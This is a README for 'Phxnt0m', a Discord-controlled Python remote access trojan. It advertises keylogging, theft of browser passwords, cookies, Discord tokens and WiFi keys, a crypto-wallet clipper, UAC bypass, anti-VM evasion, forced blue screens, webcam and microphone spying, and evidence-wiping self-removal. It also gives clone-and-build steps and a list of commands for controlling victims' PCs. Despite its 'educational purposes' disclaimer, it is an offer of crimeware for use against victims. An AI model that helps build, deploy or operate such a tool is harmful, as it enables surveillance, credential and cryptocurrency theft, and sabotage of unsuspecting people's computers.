<span align='center'>

# `Phxnt0m Malware`

<p align='center'><img src="https://images.guns.lol/zs5AK.png" width=500 /></p>

`Advanced RAT malware written in Python, fully controllable through Discord with dedicated GUI builder to make preparation easier.`

</span>

--------------------

## Info?

Join our Telegram for more information and detailed building instructions.

[![Telegram - Channel](https://img.shields.io/badge/pysilon-announcements-blue?style=for-the-badge&logo=telegram&logoColor=white)](https://t.me/Phxnt0mware)



--------------------

# Disclaimer
> Information and code provided on this repository are for educational purposes only. The creator is no way responsible for any direct or indirect damage caused due to the misusage of the information. Everything you do, you are doing at your own risk and responsibility.

--------------------

# Features
### Phxnt0m malware can do plenty of things, like:
- handle multiple PCs (not only one, like in most of the cases)
- UAC Bypass (gain *Administrative permissions* on startup)
- **delete itself whenever you want**
- log every key pressed on *keyboard* (keylogger)
- take *screenshots* anytime you want
- record *screen* anytime you want
- elevate itself to *critical process* (will trigger *Blue Screen of Death* when killed)
- directly *manipulate* **victim's PC graphics** (display custom "things"->[bitmaps, images, texts, glitch effects])
- turn **off**/**on** *monitors* of victim's PC
- **block** access to any *website*
- browse and kill running *processes*
- disable processes (make certain processes **impossible** to run)
- *communicate* with the victim in several ways
- use *Text-To-Speech* on victim's PC
- take images from *webcam*
- *block* the *mouse* and *keyboard*
- steal saved *WiFi* passwords
- grab *history*, *cookies* and *passwords* saved in web browsers
- grab *discord tokens*
- grab system information
- manipulate *Windows sounds* settings (change the *volume*)
- play **audio files** on victim's PC (in background)
- record *microphone* input (24/7) and save it in *.wav* files
- stream live *microphone* input on voice channel
- browse *files* on target PC
- upload and download *files* from target PC
- remove *files* from target PC
- execute *files* on target PC
- replace copied *crypto currency wallet* addresses to your [configured] ones
- trigger *jumpscares*
- trigger *Blue Screen of Death*
- execute *fork bomb* (crash the PC)
- *Anti-VM* (PySilon won't run on Virtual Machines, f.ex.: VirtualBox, VMWare)
- run *shell* commands (CMD/Powershell)
- ***Debug Mode*** for easier testing and `contribution`

--------------------

# Preparation<br />

`git clone https://github.com/Phxnt0m1/Phxnt0mWare-Grabber`<br />
`cd pysilon-malware`<br />
`Create Discord BOT and server`</a><br />
***Windows:*** `Run the Phxnt0m.bat either from Command Line or double clicking on it`<br />
***Linux:*** `Run the Phxnt0m.sh from Command Line`<br />

--------------------

# Available commands
 `.ss`</a> - take screenshot at any time<br />
`.screenrec`</a> - record the screen for 15 seconds<br />
`.critical-enable`</a> - elevates the process to critical status (`.critical-disable` to undo)<br />
`.display-graphic`</a> - manipulate low-level graphics by displaying pixels prepared in DrawlingStudio<br />
`.display-glitch <name>`</a> - display specified screen glitch<br />
`.monitors-off`</a> - turn off all monitors (`.monitors-on` to turn back on)<br />
`.website-block <website>`</a> - block specified website from being accessed from any browser (`.website-unblock <website>` to unblock it)<br />
`.show <what-to-show>`</a> - get list of running processes or available commands<br />
`.kill <process-name-or-id>`</a> - kill any running process<br />
`.blacklist <process-name>`</a> - adds specified process to the blacklist (victim won't be able to run it)<br />
`.whitelist <process-name>`</a> - removes specified process from the blacklist (victim will be able to run it) <br />
`.foreground`</a> - get active window process name<br />
`.msg title="<title>" text="<text>" style=<style>`</a> - send a message to victim and get the response<br />
`.tts <message>`</a> - plays a *Text-to-Speech* message on victim's PC<br />
`.webcam <action>`</a> -  use connected webcam (currently supports photos shooting)<br />
`.block-input`</a> - block the mouse and keyboard(`.unblock-input` to unblock it)<br /> `.grab <what-to-grab>`</a> - grab for example saved passwords in web browsers<br />
`.volume <value>`</a> - change the audio output volume on victim's PC<br />
`.play [<file>]`</a> - play any *.mp3* file on the victim's PC (existing one or sent in the next message if no filename was provided)<br />
`.join`</a> - join voice-channel and stream live microphone input<br />
`.pwd`</a> - show working directory<br />
`.ls`</a> - list content of working directory<br />
`.tree`</a> - show tree of working directory<br />
`.cd <directory>`</a> - change working directory<br />
`.upload <type> [<name>]`</a> - upload any file or zipped directory (also greater than 8MB ones) onto target PC<br />
`.download <file-or-directory>`</a> - download any file or zipped directory (also greater than 8MB ones) from target PC<br />
`.remove <file-or-directory>`</a> - remove file or directory on target PC<br />
`.execute <file>`</a> - run any file on target PC<br />
`.start-clipper`</a> - start crypto-clipper (swap crypto currency wallet addresses to your ones)(`.stop-clipper` to stop it)<br />
`.jumpscare [<preset>]`</a> - play very loud and rapidly flashing video or other graphics<br />
`.bsod`</a> - trigger Blue Screen of Death<br />
`.forkbomb`</a> - execute fork bomb<br />
`.cmd <command>`</a> - execute shell command on victim's PC and send back the output<br />
`.implode`</a> - remove PySilon from target PC and clean the "evidence"<br />
`.clear`</a> - clear messages from file-related channel<br />

--------------------

### ToDo

List of features that should appear in following releases:

- [ ] webhook connection in case of unexpected circumstances (like BOT-Token banned by Discord)
- [ ] overall system info grabber with cool Discord Embeds
- [ ] traditional reverse shell creator
- [ ] grab credit cards information
- [ ] optional crypto mining (for example, when victim is idle)
- [ ] grab sessions from popular applications (Steam/Minecraft/Metamask/Exodus/Roblox)
